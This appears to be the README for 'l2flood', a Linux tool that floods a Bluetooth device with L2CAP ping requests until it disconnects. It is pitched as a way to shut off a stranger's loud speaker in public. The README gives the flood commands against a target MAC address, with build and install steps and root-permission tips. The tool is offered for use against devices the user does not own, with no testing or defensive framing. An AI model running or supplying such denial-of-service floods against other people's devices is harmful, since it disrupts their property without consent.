Suppose there is a loud bluetooth speaker in public, and `94:3a:2c:e1:2b:07` is its MAC address. You can shut it off like below:

```bash
./l2flood 94:3a:2c:e1:2b:07       # Flood with as much threads as there are CPU cores.
./l2flood -n 50 94:3a:2c:e1:2b:07 # Flood with 50 threads.
```

A weak speaker CPU will not be able to process that many ping requests, and music decoding simultaneously so it disconnects.

## How to use

- Assuming you're on a Linux machine

1. `sudo apt install -y libbluetooth-dev`
2. `git clone https://github.com/indeqs/l2flood`
3. `cd l2flood`
4. `make`
5. `sudo make install`


## Note

- No, it doesn't work on Termux

- Q: I get the error `Can't create socket: Operation not permitted?`

  A: re-run as the root user